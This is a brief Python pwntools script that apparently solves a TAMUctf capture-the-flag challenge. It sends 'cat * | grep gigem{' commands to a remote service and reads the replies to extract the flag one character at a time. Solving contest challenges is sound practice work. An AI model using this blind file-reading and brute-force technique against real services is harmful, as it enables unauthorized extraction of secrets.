from pwn import *

io = remote('challenges.tamuctf.com', 3424)

base = "cat * | grep gigem{"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}"

i=0
while True:
	s = io.recvuntil(":")
	payload = base + charset[i]
	print "[DEBUG] " + payload
	io.sendline(payload)
	s = io.recvline()
	if "0" in s:
		print "found new char " + charset[i]
		base += charset[i]
		if charset[i] == "}":
			break
		i=-1

	i+=1

print base
